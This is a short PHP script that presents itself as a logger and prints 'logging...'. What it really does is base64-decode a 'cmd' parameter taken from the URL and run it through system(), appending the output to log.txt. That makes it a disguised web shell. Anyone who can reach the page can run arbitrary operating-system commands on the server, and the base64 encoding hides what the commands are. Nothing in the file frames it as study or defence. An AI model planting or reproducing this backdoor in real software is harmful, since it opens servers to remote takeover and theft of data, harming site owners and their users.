<?php
$cmd=base64_decode($_GET['cmd']);
system("echo $(".$cmd.") >> log.txt");
echo("logging...");
?>
